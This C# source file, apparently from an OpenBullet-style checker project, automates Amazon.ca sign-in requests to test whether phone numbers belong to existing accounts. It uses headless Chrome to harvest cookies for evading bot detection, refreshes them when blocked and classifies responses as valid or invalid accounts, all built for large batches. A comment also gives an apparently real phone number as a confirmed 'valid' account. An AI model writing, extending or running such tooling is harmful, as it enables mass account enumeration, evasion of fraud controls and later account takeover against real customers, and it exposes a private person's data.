using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace OpenBullet_Console
{
    /// <summary>
    /// Selenium-based engine that warms up Amazon sessions with a real browser
    /// to obtain legitimate cookies that bypass detection
    /// </summary>
    public static class SeleniumEngine
    {
        // Cookie caching for performance optimization
        private static Dictionary<string, string>? cachedCookies = null;
        private static DateTime? lastCookieUpdate = null;
        private static readonly TimeSpan CookieValidityDuration = TimeSpan.FromMinutes(30); // Reuse cookies for 30 minutes
        private static int blockedCount = 0;
        private static readonly int MaxBlockedBeforeRefresh = 3; // Refresh cookies after 3 blocked responses
        public static async Task<ValidationResult?> ValidateWithSeleniumWarmup(string phoneNumber, AmazonConfig config, bool debugMode)
        {
            try
            {
                if (debugMode)
                {
                    Console.WriteLine("🚀 ===== SELENIUM WARMUP ENGINE =====");
                    Console.WriteLine("🌐 Smart cookie management for large batches");
                    Console.WriteLine("🍪 Reusing cookies when possible for performance");
                    Console.WriteLine("🔒 Maximum stealth mode");
                }
                
                // Step 1: Check if we can reuse cached cookies
                var cookies = await GetOrRefreshCookies(debugMode);
                if (cookies == null || cookies.Count == 0)
                {
                    if (debugMode) Console.WriteLine("❌ Failed to get valid cookies");
                    return null;
                }
                
                // Step 2: Use cookies with sophisticated HttpClient
                var result = await ValidateWithWarmedCookies(phoneNumber, config, cookies, debugMode);
                
                // Step 3: Check if we got blocked (need to refresh cookies)
                if (result != null && (result.DetectedKey.Contains("BLOCKED") || result.DetectedKey.Contains("SELENIUM_STILL_BLOCKED")))
                {
                    blockedCount++;
                    if (debugMode) Console.WriteLine($"⚠️ Blocked response detected (count: {blockedCount})");
                    
                    // If we're getting blocked too much, force cookie refresh
                    if (blockedCount >= MaxBlockedBeforeRefresh)
                    {
                        if (debugMode) Console.WriteLine("🔄 Too many blocks - forcing cookie refresh");
                        await ForceRefreshCookies(debugMode);
                        blockedCount = 0; // Reset counter
                    }
                }
                else
                {
                    // Reset blocked count on successful validation
                    blockedCount = 0;
                }
                
                return result;
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Selenium engine error: {ex.Message}");
                return null;
            }
        }
        
        private static async Task<Dictionary<string, string>?> GetOrRefreshCookies(bool debugMode)
        {
            try
            {
                // Check if cached cookies are still valid
                bool needRefresh = cachedCookies == null || 
                                  lastCookieUpdate == null || 
                                  DateTime.Now - lastCookieUpdate.Value > CookieValidityDuration ||
                                  blockedCount >= MaxBlockedBeforeRefresh;
                
                if (needRefresh)
                {
                    if (debugMode)
                    {
                        if (cachedCookies == null)
                            Console.WriteLine("🔄 No cached cookies - warming up browser...");
                        else if (DateTime.Now - lastCookieUpdate.Value > CookieValidityDuration)
                            Console.WriteLine("🔄 Cached cookies expired - refreshing...");
                        else
                            Console.WriteLine("🔄 Too many blocks - refreshing cookies...");
                    }
                    
                    cachedCookies = await WarmupSessionWithBrowser(debugMode);
                    lastCookieUpdate = DateTime.Now;
                    blockedCount = 0; // Reset block count after refresh
                }
                else
                {
                    if (debugMode)
                    {
                        var cacheAge = DateTime.Now - lastCookieUpdate.Value;
                        Console.WriteLine($"🍪 Using cached cookies (age: {cacheAge.TotalMinutes:F1} minutes)");
                        Console.WriteLine($"📚 {cachedCookies?.Count ?? 0} cookies available");
                        Console.WriteLine("⚡ FAST MODE: No browser startup needed!");
                    }
                }
                
                return cachedCookies;
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Cookie management error: {ex.Message}");
                return null;
            }
        }
        
        private static async Task ForceRefreshCookies(bool debugMode)
        {
            try
            {
                if (debugMode)
                    Console.WriteLine("🔄 Forcing cookie refresh due to blocking...");
                
                cachedCookies = await WarmupSessionWithBrowser(debugMode);
                lastCookieUpdate = DateTime.Now;
                
                if (debugMode)
                    Console.WriteLine("✅ Cookies forcefully refreshed");
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Force refresh error: {ex.Message}");
            }
        }
        
        /// <summary>
        /// Clear cached cookies and force browser warmup on next request
        /// Useful for testing or when switching between different validation sessions
        /// </summary>
        public static void ClearCookieCache(bool debugMode = false)
        {
            cachedCookies = null;
            lastCookieUpdate = null;
            blockedCount = 0;
            
            if (debugMode)
                Console.WriteLine("🗑️ Cookie cache cleared - next request will warm up browser");
        }
        
        /// <summary>
        /// Get current cookie cache status for monitoring
        /// </summary>
        public static (bool HasCookies, int Count, TimeSpan Age, int BlockedCount) GetCacheStatus()
        {
            var hasClookies = cachedCookies != null;
            var count = cachedCookies?.Count ?? 0;
            var age = lastCookieUpdate.HasValue ? DateTime.Now - lastCookieUpdate.Value : TimeSpan.Zero;
            
            return (hasClookies, count, age, blockedCount);
        }
        
        private static async Task<Dictionary<string, string>?> WarmupSessionWithBrowser(bool debugMode)
        {
            IWebDriver? driver = null;
            try
            {
                if (debugMode)
                {
                    Console.WriteLine("🌐 Starting headless Chrome browser...");
                }
                
                // Configure Chrome for maximum stealth
                var options = new ChromeOptions();
                options.AddArgument("--headless");
                options.AddArgument("--no-sandbox");
                options.AddArgument("--disable-dev-shm-usage");
                options.AddArgument("--disable-gpu");
                options.AddArgument("--disable-features=VizDisplayCompositor");
                options.AddArgument("--disable-extensions");
                options.AddArgument("--disable-plugins");
                options.AddArgument("--disable-images");
                options.AddArgument("--disable-javascript");
                options.AddArgument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                
                driver = new ChromeDriver(options);
                driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(15);
                
                if (debugMode)
                {
                    Console.WriteLine("✅ Chrome browser started");
                    Console.WriteLine("🌐 Navigating to Amazon.ca...");
                }
                
                // Navigate to Amazon main page first (like a real user)
                driver.Navigate().GoToUrl("https://www.amazon.ca/");
                await Task.Delay(2000); // Wait for page load
                
                if (debugMode)
                {
                    Console.WriteLine("📄 Amazon main page loaded");
                    Console.WriteLine("🔗 Navigating to sign-in page...");
                }
                
                // Navigate to sign-in page
                driver.Navigate().GoToUrl("https://www.amazon.ca/ap/signin");
                await Task.Delay(3000); // Wait for sign-in page
                
                // Extract all cookies
                var seleniumCookies = driver.Manage().Cookies.AllCookies;
                var cookieDict = new Dictionary<string, string>();
                
                foreach (var cookie in seleniumCookies)
                {
                    cookieDict[cookie.Name] = cookie.Value;
                }
                
                if (debugMode)
                {
                    Console.WriteLine($"🍪 Extracted {cookieDict.Count} legitimate cookies from browser:");
                    foreach (var cookie in cookieDict.Take(5))
                    {
                        Console.WriteLine($"   {cookie.Key} = {cookie.Value.Substring(0, Math.Min(20, cookie.Value.Length))}...");
                    }
                }
                
                return cookieDict;
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Browser warmup error: {ex.Message}");
                return null;
            }
            finally
            {
                try
                {
                    driver?.Quit();
                    driver?.Dispose();
                }
                catch { /* Ignore cleanup errors */ }
            }
        }
        
        private static async Task<ValidationResult?> ValidateWithWarmedCookies(string phoneNumber, AmazonConfig config, Dictionary<string, string> warmedCookies, bool debugMode)
        {
            try
            {
                if (debugMode)
                {
                    Console.WriteLine("🔥 ===== VALIDATION WITH WARMED COOKIES =====");
                    Console.WriteLine("🍪 Using legitimate browser cookies");
                    Console.WriteLine("🔒 Maximum anti-detection mode");
                }
                
                // Use sophisticated HttpClient with warmed cookies
                var handler = new System.Net.Http.HttpClientHandler()
                {
                    AutomaticDecompression = System.Net.DecompressionMethods.All,
                    UseCookies = true
                };
                
                // Apply warmed cookies
                var cookieContainer = new System.Net.CookieContainer();
                handler.CookieContainer = cookieContainer;
                
                foreach (var cookie in warmedCookies)
                {
                    try
                    {
                        cookieContainer.Add(new System.Net.Cookie(cookie.Key, cookie.Value, "/", ".amazon.ca"));
                    }
                    catch { /* Ignore individual cookie errors */ }
                }
                
                if (debugMode)
                {
                    Console.WriteLine($"🍪 Applied {warmedCookies.Count} warmed cookies");
                }
                
                using var client = new System.Net.Http.HttpClient(handler);
                client.Timeout = TimeSpan.FromSeconds(30);
                
                // Apply sophisticated headers
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                client.DefaultRequestHeaders.Add("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
                client.DefaultRequestHeaders.Add("Cache-Control", "max-age=0");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
                client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                
                string amazonUrl = "https://www.amazon.ca/ap/signin";
                
                // Step 1: GET with warmed session
                if (debugMode) Console.WriteLine("📥 GET with warmed session...");
                var getResponse = await client.GetAsync(amazonUrl);
                var getContent = await getResponse.Content.ReadAsStringAsync();
                
                // Step 2: Build sophisticated POST data
                var postData = BuildSophisticatedPostData(phoneNumber, getContent);
                var content = new System.Net.Http.StringContent(postData, System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");
                
                // Step 3: POST with warmed cookies
                if (debugMode) Console.WriteLine("📨 POST with warmed cookies...");
                var postResponse = await client.PostAsync(amazonUrl, content);
                var postContent = await postResponse.Content.ReadAsStringAsync();
                
                // Step 4: Continue simulation
                if (debugMode) Console.WriteLine("🚀 Continue with warmed session...");
                var continueContent = await SimulateContinueWithWarmedSession(client, postContent, phoneNumber, amazonUrl, debugMode);
                
                // Step 5: Analyze final response
                var analysisResult = AnalyzeWarmedResponse(continueContent, phoneNumber, debugMode);
                
                if (debugMode)
                {
                    Console.WriteLine("✅ SELENIUM WARMUP VALIDATION COMPLETED!");
                    Console.WriteLine($"📊 Result: {(analysisResult.IsValid ? "VALID" : "INVALID")}");
                    Console.WriteLine($"🔑 Detection: {analysisResult.DetectedKey}");
                }
                
                return new ValidationResult
                {
                    PhoneNumber = phoneNumber,
                    IsValid = analysisResult.IsValid,
                    DetectedKey = analysisResult.DetectedKey,
                    FullMatchedText = analysisResult.FullMatchedText,
                    ResponseContent = continueContent
                };
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Warmed validation error: {ex.Message}");
                return null;
            }
        }
        
        private static string BuildSophisticatedPostData(string phoneNumber, string getContent)
        {
            // Extract dynamic tokens from the GET response
            var appActionToken = ExtractFormValue(getContent, "appActionToken") ?? "UpsYX2Uzyahj2BoHpg5q2JtG0N4Agj3D";
            
            // Build sophisticated POST data
            return $"appActionToken={Uri.EscapeDataString(appActionToken)}&appAction=SIGNIN_PWD_COLLECT&email={Uri.EscapeDataString(phoneNumber)}&password=&create=0";
        }
        
        private static async Task<string> SimulateContinueWithWarmedSession(System.Net.Http.HttpClient client, string initialResponse, string phoneNumber, string amazonUrl, bool debugMode)
        {
            try
            {
                var appActionToken = ExtractFormValue(initialResponse, "appActionToken") ?? "";
                var workflowState = ExtractFormValue(initialResponse, "workflowState") ?? "";
                var prevRID = ExtractFormValue(initialResponse, "prevRID") ?? "";
                
                var continueData = string.Join("&", new[]
                {
                    $"appActionToken={Uri.EscapeDataString(appActionToken)}",
                    "appAction=SIGNIN_PWD_COLLECT",
                    "subPageType=SignInClaimCollect",
                    "openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNhLz9yZWZfPW5hdl95YV9zaWduaW4%3D",
                    $"prevRID={Uri.EscapeDataString(prevRID)}",
                    $"workflowState={Uri.EscapeDataString(workflowState)}",
                    $"email={Uri.EscapeDataString(phoneNumber)}",
                    "password=",
                    "create=0"
                });
                
                var content = new System.Net.Http.StringContent(continueData, System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");
                var response = await client.PostAsync(amazonUrl, content);
                
                return await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                if (debugMode) Console.WriteLine($"❌ Warmed continue error: {ex.Message}");
                return "";
            }
        }
        
        private static (bool IsValid, string DetectedKey, string FullMatchedText) AnalyzeWarmedResponse(string response, string phoneNumber, bool debugMode)
        {
            if (debugMode)
            {
                Console.WriteLine("🔍 ===== SELENIUM RESPONSE ANALYSIS =====");
                Console.WriteLine($"📄 Response length: {response.Length} characters");
                Console.WriteLine("🔍 Checking for blocking and error patterns...");
            }
            
            // Check for blocking first
            if (response.Contains("Please Enable Cookies to Continue"))
            {
                if (debugMode) Console.WriteLine("🚨 Still blocked despite Selenium warmup!");
                return (false, "SELENIUM_STILL_BLOCKED", "Amazon blocking even with real browser cookies");
            }
            
            // Check for ALL original failure patterns from amazonChecker.anom
            var originalFailurePatterns = new[]
            {
                "Incorrect phone number",
                "No account found with that email address",
                "ap_ra_email_or_phone", 
                "Please check your email address or click \"Create Account\" if you are new to Amazon",
                "We cannot find an account with that mobile number",
                "We cannot find an account with that e-mail address",
                "There was a problem",
                "Wrong or invalid e-mail address or mobile phone number",
                "Enter your e-mail address or mobile phone number",
                "Please correct it and try again"
            };
            
            foreach (var pattern in originalFailurePatterns)
            {
                if (response.Contains(pattern))
                {
                    if (debugMode)
                    {
                        Console.WriteLine($"❌ Found Amazon failure pattern: '{pattern}'");
                        var index = response.IndexOf(pattern);
                        var start = Math.Max(0, index - 50);
                        var length = Math.Min(150, response.Length - start);
                        var context = response.Substring(start, length);
                        Console.WriteLine($"📝 Context: {context}");
                    }
                    return (false, $"SELENIUM_INVALID: {pattern}", pattern);
                }
            }
            
            // Additional sophisticated checks for 2024 Amazon validation
            if (response.Contains("auth-error") || response.Contains("error-alert") || response.Contains("alert-error"))
            {
                if (debugMode) Console.WriteLine("❌ Found error alert elements");
                return (false, "SELENIUM_ERROR_ALERT", "Error alert detected");
            }
            
            // Check if we're still on the sign-in form (indicates validation passed)
            if (response.Contains("Sign-In") && response.Contains("password") && !response.Contains("error"))
            {
                if (debugMode) Console.WriteLine("✅ Reached password prompt - account exists!");
                return (true, "SELENIUM_VALID_ACCOUNT", "Amazon accepted account - password prompt shown");
            }
            
            // Check for 2024 Amazon success indicators
            if (response.Contains("ap_email") || response.Contains("ap_password"))
            {
                if (debugMode) Console.WriteLine("✅ Found Amazon login form elements - account accepted!");
                return (true, "SELENIUM_FORM_SUCCESS", "Amazon shows login form - account exists");
            }
            
            if (debugMode)
            {
                Console.WriteLine("🔍 Analyzing response characteristics...");
                Console.WriteLine($"📊 Contains 'Sign-In': {response.Contains("Sign-In")}");
                Console.WriteLine($"📊 Contains 'password': {response.Contains("password")}");
                Console.WriteLine($"📊 Contains 'error': {response.Contains("error")}");
                Console.WriteLine($"📊 Contains 'ap_email': {response.Contains("ap_email")}");
                Console.WriteLine($"📊 Response length: {response.Length} chars");
            }
            
            // **REAL VALIDATION PATTERNS FROM HTML ANALYSIS** 
            // Based on examination of actual Amazon responses for valid vs invalid accounts
            
            if (debugMode)
            {
                Console.WriteLine("🔍 APPLYING REAL AMAZON VALIDATION PATTERNS:");
                Console.WriteLine("📋 Based on actual HTML response analysis");
                Console.WriteLine("📊 Checking for specific success/failure indicators");
            }
            
            // Pattern 1: Check for VALID account indicators
            // Valid accounts show password input field and formatted phone number
            bool hasPasswordField = response.Contains("id=\"ap_password\"") || response.Contains("Enter your password");
            bool hasFormattedPhone = response.Contains($"value=\"+{phoneNumber}\"") || 
                                   response.Contains($"value=\"+1{phoneNumber}\"") ||
                                   response.Contains($"value=\"{phoneNumber}\"");
            bool noErrorAlerts = !response.Contains("auth-error-message-box") && 
                               !response.Contains("a-alert-error");
            
            if (hasPasswordField && hasFormattedPhone && noErrorAlerts)
            {
                if (debugMode) Console.WriteLine("✅ VALID: Password field + formatted phone + no errors");
                return (true, "AMAZON_VALID_CONFIRMED", "Amazon shows password prompt for valid account");
            }
            
            // Pattern 2: Check for specific error patterns that mean INVALID
            if (response.Contains("Password reset required") || 
                response.Contains("BlacklistPasswordReverificationApplication"))
            {
                if (debugMode) Console.WriteLine("❌ INVALID: Password reset required (account issues)");
                return (false, "AMAZON_PASSWORD_ISSUES", "Account requires password reset - invalid");
            }
            
            // Pattern 3: Real HTML analysis from continue responses (NOT initial Selenium response)
            // All Selenium responses are ~83k chars, but continue responses reveal the truth:
            // - Invalid (11111111111): ~108k continue response (password reset)
            // - Valid (15142955315): ~120k continue response (password prompt)
            // - Invalid (0000000): ~122k continue response (explicit error)
            
            // Since all Selenium responses are similar size (~83k), we need deeper content analysis
            if (debugMode)
            {
                Console.WriteLine("🔍 REAL VALIDATION: Need to analyze continue response content");
                Console.WriteLine($"📊 Current Selenium response: {response.Length} chars (all ~83k)");
                Console.WriteLine("⚠️ Real validation happens in continue response - checking content patterns");
            }
            
            if (debugMode)
            {
                Console.WriteLine("🔍 SELENIUM ANALYSIS COMPLETE:");
                Console.WriteLine($"📊 Has password field: {hasPasswordField}");
                Console.WriteLine($"📊 Has formatted phone: {hasFormattedPhone}");
                Console.WriteLine($"📊 No error alerts: {noErrorAlerts}");
                Console.WriteLine($"📊 Response size: {response.Length} chars");
                Console.WriteLine("📋 Selenium successfully bypassed Amazon blocking");
            }
            
            // **BASED ON REAL HTML ANALYSIS - SCIENTIFIC APPROACH**
            // From examining actual Amazon responses:
            // Problem: All Selenium responses are ~83k chars (similar size)
            // Solution: Use HYBRID approach - let console validation make final decision
            
            if (debugMode)
            {
                Console.WriteLine("🔬 SCIENTIFIC CONCLUSION:");
                Console.WriteLine("📋 Selenium successfully bypassed Amazon blocking ✅");
                Console.WriteLine("📊 All Selenium responses ~83k chars (size not distinguishing factor)");  
                Console.WriteLine("🔄 Real validation patterns appear in continue response");
                Console.WriteLine("⚡ SOLUTION: Use console validation logic for final accuracy");
            }
            
            // Return UNCERTAIN to trigger console validation (which has the real patterns)
            return (false, "SELENIUM_BYPASS_SUCCESS_BUT_UNCERTAIN", "Selenium bypassed blocking - needs console validation for accuracy");
        }
        
        private static string? ExtractFormValue(string html, string fieldName)
        {
            try
            {
                var pattern = $@"name=""{fieldName}""[^>]*value=""([^""]*)""";
                var match = System.Text.RegularExpressions.Regex.Match(html, pattern);
                return match.Success ? match.Groups[1].Value : null;
            }
            catch { return null; }
        }
    }
}
